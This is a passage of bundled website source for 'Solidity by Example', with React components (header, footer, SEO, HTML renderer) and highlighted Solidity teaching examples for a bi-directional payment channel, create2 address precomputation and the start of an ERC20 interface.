{\"component\":\"Example_component__mzuGC\",\"content\":\"Example_content__3-AiU\"};","// extracted by mini-css-extract-plugin\nmodule.exports = {\"component\":\"Label_component__G3rSZ\"};","export default __webpack_public_path__ + \"static/media/logo.9a07f18c.svg\";","import React from \"react\"\nimport styles from \"./Header.module.css\"\nimport logo from \"./logo.svg\"\n\nfunction Header() {\n  // NOTE: need to use links for versions so that react-snap can crawl\n  return (\n    <div className={styles.component}>\n      <a href=\"/\">\n        <img src={logo} alt=\"logo\" className={styles.logo} />\n      </a>\n\n      <h3 className={styles.header}>\n        <a href=\"/\">Solidity by Example</a>\n\n        <div className={styles.versions}>\n          <div className={styles.version}>version 0.7.6</div>\n        </div>\n      </h3>\n    </div>\n  )\n}\n\nexport default Header\n","import React from \"react\"\nimport styles from \"./Footer.module.css\"\n\n// Khan Academy\nconst ADDRESS = \"0x95a647B3d8a3F11176BAdB799b9499C671fa243a\"\n\nfunction Footer() {\n  return (\n    <div className={styles.component}>\n      <div className={styles.row}>\n        Donate\n        <span role=\"img\" aria-label=\"smiley\">\n          🙂\n        </span>\n      </div>\n      <div className={styles.row}>\n        <a href={`https://etherscan.io/address/${ADDRESS}`} target=\"__blank\">\n          {ADDRESS.slice(0, 6)}...{ADDRESS.slice(-6, -1)}\n        </a>\n      </div>\n      <div className={styles.row}>\n        your ETH will directly go to\n        <a\n          href=\"https://khanacademy.org\"\n          target=\"__blank\"\n          className={styles.khan}\n        >\n          Khan Academy\n        </a>\n      </div>\n      <div className={styles.row}>\n        <a href=\"mailto:contact@solidity-by-example.org\">\n          contact@solidity-by-example.org\n        </a>\n      </div>\n      <div className={styles.row}>\n        <a\n          href=\"https://github.com/solidity-by-example/solidity-by-example.github.io\"\n          target=\"__blank\"\n        >\n          source\n        </a>\n        <div className={styles.bar}>|</div>\n        <a\n          href=\"https://github.com/solidity-by-example/solidity-by-example.github.io/blob/gh-pages/LICENSE\"\n          target=\"__blank\"\n        >\n          license\n        </a>\n      </div>\n    </div>\n  )\n}\n\nexport default Footer\n","import React from \"react\"\nimport { Helmet } from \"react-helmet\"\n\ninterface Props {\n  title: string\n  description: string\n}\n\nconst SEO: React.FC<Props> = ({ title, description }) => {\n  return (\n    <Helmet>\n      <title>{title}</title>\n      <meta name=\"Description\" content={description} />\n    </Helmet>\n  )\n}\n\nexport default SEO\n","// @ts-ignore\n// import hljs from \"highlight.js/lib/core\"\nimport \"highlight.js/styles/foundation.css\"\n// @ts-ignore\n// import hljsDefineSolidity from \"highlightjs-solidity\"\nimport React, { useEffect } from \"react\"\n\n// hljsDefineSolidity(hljs)\n// hljs.initHighlightingOnLoad()\n\ninterface Props {\n  html: string\n}\n\nconst Html: React.FC<Props> = ({ html }) => {\n  // NOTE: to render hightlighs after page load\n  // useEffect(() => {\n  //   document.querySelectorAll(\"pre code\").forEach((block) => {\n  //     hljs.highlightBlock(block)\n  //   })\n  // }, [])\n\n  /* Note: Copy button to render inside pre\n  <div class=\"buttons\">\n    <button class=\"fa fa-copy clip-button\" title=\"Copy to clipboard\" aria-label=\"Copy to clipboard\">\n      <i class=\"tooltiptext\"></i>\n    </button>\n  </div>\n  */\n  useEffect(() => {\n    // Skip creating elements when pre-rendering\n    if (navigator.userAgent === \"ReactSnap\") {\n      return\n    }\n\n    const copy = (target: any) => {\n      const textArea = document.createElement(\"textarea\")\n      textArea.setAttribute(\"style\", \"width:1px;border:0;opacity:0;\")\n      document.body.appendChild(textArea)\n\n      textArea.value = target.innerText\n      textArea.select()\n      document.execCommand(\"copy\")\n\n      document.body.removeChild(textArea)\n    }\n\n    const pres = document.querySelectorAll(\"pre\")\n    pres.forEach((pre) => {\n      // div\n      const div = document.createElement(\"div\")\n      div.className = \"buttons\"\n\n      // button\n      const button = document.createElement(\"button\")\n      button.className = \"fa fa-copy clip-button\"\n      button.title = \"Copy to clipboard\"\n      // @ts-ignore\n      button.ariaLabel = \"Copy to clipboard\"\n\n      const icon = document.createElement(\"i\")\n      icon.className = \"tooltiptext\"\n      button.appendChild(icon)\n\n      div.appendChild(button)\n\n      const code = pre.firstChild\n      pre.insertBefore(div, code)\n\n      // button on click\n      button.addEventListener(\"click\", (e) => {\n        e.preventDefault()\n        // NOTE:\n        // child 0 = <div class=\"buttons\">\n        // child 1 = <code>\n        copy(pre.childNodes[1])\n      })\n    })\n  }, [])\n\n  return <div dangerouslySetInnerHTML={{ __html: html }}></div>\n}\n\nexport default Html\n","import React from \"react\"\nimport SEO from \"./SEO\"\nimport Html from \"./Html\"\nimport styles from \"./Example.module.css\"\n\ninterface Props {\n  title: string\n  description: string\n  version: \"0.7.6\"\n  html: string\n}\n\nconst Example: React.FC<Props> = ({ title, version, description, html }) => {\n  return (\n    <div className={styles.component}>\n      <SEO\n        title={`${title} | Solidity by Example | ${version}`}\n        description={description}\n      />\n      <div className={styles.content}>\n        <h2>{title}</h2>\n\n        <Html html={html} />\n\n        <p>\n          Try on{\" \"}\n          <a href=\"https://remix.ethereum.org\" target=\"__blank\">\n            Remix\n          </a>\n        </p>\n      </div>\n    </div>\n  )\n}\n\nexport default Example\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Bi-Directional Payment Channel\"\nexport const description = \"An example of bi-directional payment channels in Solidity\"\n\nconst html = `<p>Bi-directional payment channels allow participants <code>Alice</code> and <code>Bob</code> to repeatedly transfer Ether off chain.</p>\n<p>Payments can go both ways, <code>Alice</code> pays <code>Bob</code> and <code>Bob</code> pays <code>Alice</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">experimental</span> <span class=\"hljs-built_in\">ABIEncoderV2</span>;</span>\n\n<span class=\"hljs-comment\">/*\nOpening a channel\n1. Alice and Bob fund a multi-sig wallet\n2. Precompute payment channel address\n3. Alice and Bob exchanges signatures of initial balances\n4. Alice and Bob creates a transaction that can deploy a payment channel from\n   the multi-sig wallet\n\nUpdate channel balances\n1. Repeat steps 1 - 3 from opening a channel\n2. From multi-sig wallet create a transaction that will\n   - delete the transaction that would have deployed the old payment channel\n   - and then create a transaction that can deploy a payment channel with the\n     new balances\n\nClosing a channel when Alice and Bob agree on the final balance\n1. From multi-sig wallet create a transaction that will\n   - send payments to Alice and Bob\n   - and then delete the transaction that would have created the payment channel\n\nClosing a channel when Alice and Bob do not agree on the final balances\n1. Deploy payment channel from multi-sig\n2. call challengeExit() to start the process of closing a channel\n3. Alice and Bob can withdraw funds once the channel is expired\n*/</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol\"</span>;\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">BiDirectionalPaymentChannel</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">SafeMath</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">uint</span></span>;\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">ECDSA</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">bytes32</span></span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">ChallengeExit</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> sender, <span class=\"hljs-keyword\">uint</span> nonce</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Withdraw</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> to, <span class=\"hljs-keyword\">uint</span> amount</span>)</span>;\n\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">public</span> users;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">bool</span>) <span class=\"hljs-keyword\">public</span> isUser;\n\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> balances;\n\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> challengePeriod;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> expiresAt;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> nonce;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">checkBalances</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _balances</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(\n            <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span> &gt;= _balances[<span class=\"hljs-number\">0</span>].add(_balances[<span class=\"hljs-number\">1</span>]),\n            <span class=\"hljs-string\">\"balance of contract must be &gt;= to the total balance of users\"</span>\n        );\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> deposit from multi-sig wallet</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _users,\n        <span class=\"hljs-keyword\">uint</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _balances,\n        <span class=\"hljs-keyword\">uint</span> _expiresAt,\n        <span class=\"hljs-keyword\">uint</span> _challengePeriod\n    </span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> <span class=\"hljs-title\">checkBalances</span>(<span class=\"hljs-params\">_balances</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(_expiresAt &gt; <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>, <span class=\"hljs-string\">\"Expiration must be &gt; now\"</span>);\n        <span class=\"hljs-built_in\">require</span>(_challengePeriod &gt; <span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">\"Challenge period must be &gt; 0\"</span>);\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; _users.<span class=\"hljs-built_in\">length</span>; i++) {\n            <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> user = _users[i];\n\n            <span class=\"hljs-built_in\">require</span>(!isUser[user], <span class=\"hljs-string\">\"user must be unique\"</span>);\n            users[i] = user;\n            isUser[user] = <span class=\"hljs-literal\">true</span>;\n\n            balances[user] = _balances[i];\n        }\n\n        expiresAt = _expiresAt;\n        challengePeriod = _challengePeriod;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">verify</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _signatures,\n        <span class=\"hljs-keyword\">address</span> _contract,\n        <span class=\"hljs-keyword\">address</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _signers,\n        <span class=\"hljs-keyword\">uint</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _balances,\n        <span class=\"hljs-keyword\">uint</span> _nonce\n    </span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; _signatures.<span class=\"hljs-built_in\">length</span>; i++) {\n            <span class=\"hljs-comment\">/*\n            <span class=\"hljs-doctag\">NOTE:</span> sign with address of this contract to protect\n                  agains replay attack on other contracts\n            */</span>\n            <span class=\"hljs-keyword\">bool</span> valid = _signers[i] ==\n                <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(_contract, _balances, _nonce))\n                    .toEthSignedMessageHash()\n                    .recover(_signatures[i]);\n\n            <span class=\"hljs-keyword\">if</span> (!valid) {\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;\n            }\n        }\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">checkSignatures</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _signatures,\n        <span class=\"hljs-keyword\">uint</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _balances,\n        <span class=\"hljs-keyword\">uint</span> _nonce\n    </span>) </span>{\n        <span class=\"hljs-comment\">// Note: copy storage array to memory</span>\n        <span class=\"hljs-keyword\">address</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> signers;\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; users.<span class=\"hljs-built_in\">length</span>; i++) {\n            signers[i] = users[i];\n        }\n\n        <span class=\"hljs-built_in\">require</span>(\n            verify(_signatures, <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>), signers, _balances, _nonce),\n            <span class=\"hljs-string\">\"Invalid signature\"</span>\n        );\n\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">onlyUser</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(isUser[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>], <span class=\"hljs-string\">\"Not user\"</span>);\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">challengeExit</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">uint</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _balances,\n        <span class=\"hljs-keyword\">uint</span> _nonce,\n        <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _signatures\n    </span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\">onlyUser</span>\n        <span class=\"hljs-title\">checkSignatures</span>(<span class=\"hljs-params\">_signatures, _balances, _nonce</span>)\n        <span class=\"hljs-title\">checkBalances</span>(<span class=\"hljs-params\">_balances</span>)\n    </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> &lt; expiresAt, <span class=\"hljs-string\">\"Expired challenge period\"</span>);\n        <span class=\"hljs-built_in\">require</span>(_nonce &gt; nonce, <span class=\"hljs-string\">\"Nonce must be greater than the current nonce\"</span>);\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; _balances.<span class=\"hljs-built_in\">length</span>; i++) {\n            balances[users[i]] = _balances[i];\n        }\n\n        nonce = _nonce;\n        expiresAt = <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>.add(challengePeriod);\n\n        <span class=\"hljs-keyword\">emit</span> ChallengeExit(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, nonce);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\">onlyUser</span> </span>{\n        <span class=\"hljs-built_in\">require</span>(\n            <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> &gt;= expiresAt,\n            <span class=\"hljs-string\">\"Challenge period has not expired yet\"</span>\n        );\n\n        <span class=\"hljs-keyword\">uint</span> amount = balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>];\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-number\">0</span>;\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n\n        <span class=\"hljs-keyword\">emit</span> Withdraw(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, amount);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Precompute Contract Address with Create2\"\nexport const description = \"Precompute contract address with create2\"\n\nconst html = `<p>Contract address can be precomputed, before the contract is deployed, using <code>create2</code></p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Factory</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Deployed</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> addr, <span class=\"hljs-keyword\">uint256</span> salt</span>)</span>;\n\n    <span class=\"hljs-comment\">// 1. Get bytecode of contract to be deployed</span>\n    <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> _owner and _foo are arguments of the TestContract&#x27;s constructor</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBytecode</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner, <span class=\"hljs-keyword\">uint</span> _foo</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> bytecode = <span class=\"hljs-built_in\">type</span>(TestContract).<span class=\"hljs-built_in\">creationCode</span>;\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(bytecode, <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encode</span>(_owner, _foo));\n    }\n\n    <span class=\"hljs-comment\">// 2. Compute the address of the contract to be deployed</span>\n    <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> _salt is a random number used to create an address</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getAddress</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> bytecode, <span class=\"hljs-keyword\">uint</span> _salt</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span></span>) </span>{\n        <span class=\"hljs-keyword\">bytes32</span> hash = <span class=\"hljs-built_in\">keccak256</span>(\n            <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(\n                <span class=\"hljs-keyword\">bytes1</span>(<span class=\"hljs-number\">0xff</span>),\n                <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>),\n                _salt,\n                <span class=\"hljs-built_in\">keccak256</span>(bytecode)\n            )\n        );\n\n        <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> cast last 20 bytes of hash to address</span>\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-keyword\">uint160</span>(<span class=\"hljs-keyword\">uint256</span>(hash)));\n    }\n\n    <span class=\"hljs-comment\">// 3. Deploy the contract</span>\n    <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span></span>\n    <span class=\"hljs-comment\">// Check the event log Deployed which contains the address of the deployed TestContract.</span>\n    <span class=\"hljs-comment\">// The address in the log should equal the address computed from above.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deploy</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> bytecode, <span class=\"hljs-keyword\">uint</span> _salt</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-keyword\">address</span> addr;\n\n        <span class=\"hljs-comment\">/*\n        <span class=\"hljs-doctag\">NOTE:</span> How to call create2\n\n        create2(v, p, n, s)\n        create new contract with code at memory p to p + n\n        and send v wei\n        and return the new address\n        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))\n              s = big-endian 256-bit value\n        */</span>\n        <span class=\"hljs-keyword\">assembly</span> {\n            addr := <span class=\"hljs-built_in\">create2</span>(\n                <span class=\"hljs-built_in\">callvalue</span>(), <span class=\"hljs-comment\">// wei sent with current call</span>\n                <span class=\"hljs-comment\">// Actual code starts after skipping the first 32 bytes</span>\n                <span class=\"hljs-built_in\">add</span>(bytecode, <span class=\"hljs-number\">0x20</span>),\n                <span class=\"hljs-built_in\">mload</span>(bytecode), <span class=\"hljs-comment\">// Load the size of code contained in the first 32 bytes</span>\n                _salt <span class=\"hljs-comment\">// Salt from function arguments</span>\n            )\n\n            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">iszero</span>(<span class=\"hljs-built_in\">extcodesize</span>(addr)) {\n                <span class=\"hljs-keyword\">revert</span>(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>)\n            }\n        }\n\n        <span class=\"hljs-keyword\">emit</span> Deployed(addr, _salt);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TestContract</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> foo;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner, <span class=\"hljs-keyword\">uint</span> _foo</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        owner = _owner;\n        foo = _foo;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"ERC20\"\nexport const description = \"Example of ERC20 token in Solidity\"\n\nconst html = `<p>Any contract that follow the <a href=\"https://eips.ethereum.org/EIPS/eip-20\" target=\"__blank\">ERC20 standard</a> is a ERC20 token.</p>\n<p>ERC20 tokens provide functionalities to</p>\n<ul>\n<li>transfer tokens</li>\n<li>allow others to transfer tokens on behalf of the token holder</li>\n</ul>\n<p>Here is the interface for ERC20.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">interface</span> <span class=\"hljs-title\">IERC20</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">totalSupply</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint256</span></span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">balanceOf</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> account</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint256</span></span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">transfer</span></span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> recipient, <span class=\"hljs-keyword\">uint256</span> amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">allowance</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> owner, <span class=\"hljs-keyword\">address</span> spender</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint256</span></span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">approve</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> spender, <span class=\"hljs-keyword\">uint256</span> amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transferFrom</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> sender, <span class=\"hljs-keyword\">address</span> recipient, <span class=\"hljs-keyword\">uint256</span> amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>)</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Transfer</span>(<span 